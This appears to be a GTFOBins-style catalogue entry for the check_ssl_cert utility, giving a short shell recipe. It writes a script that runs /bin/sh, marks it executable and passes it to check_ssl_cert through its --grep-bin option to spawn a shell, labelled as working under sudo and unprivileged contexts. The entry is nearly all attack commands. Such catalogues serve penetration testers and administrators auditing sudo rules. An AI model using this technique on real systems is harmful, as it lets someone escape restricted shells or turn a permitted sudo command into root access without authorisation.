---
type: gtfobin
name: check_ssl_cert
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# check_ssl_cert

## shell

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x
```
_The shell will be invoked multiple times._
**Contexts:** sudo, unprivileged
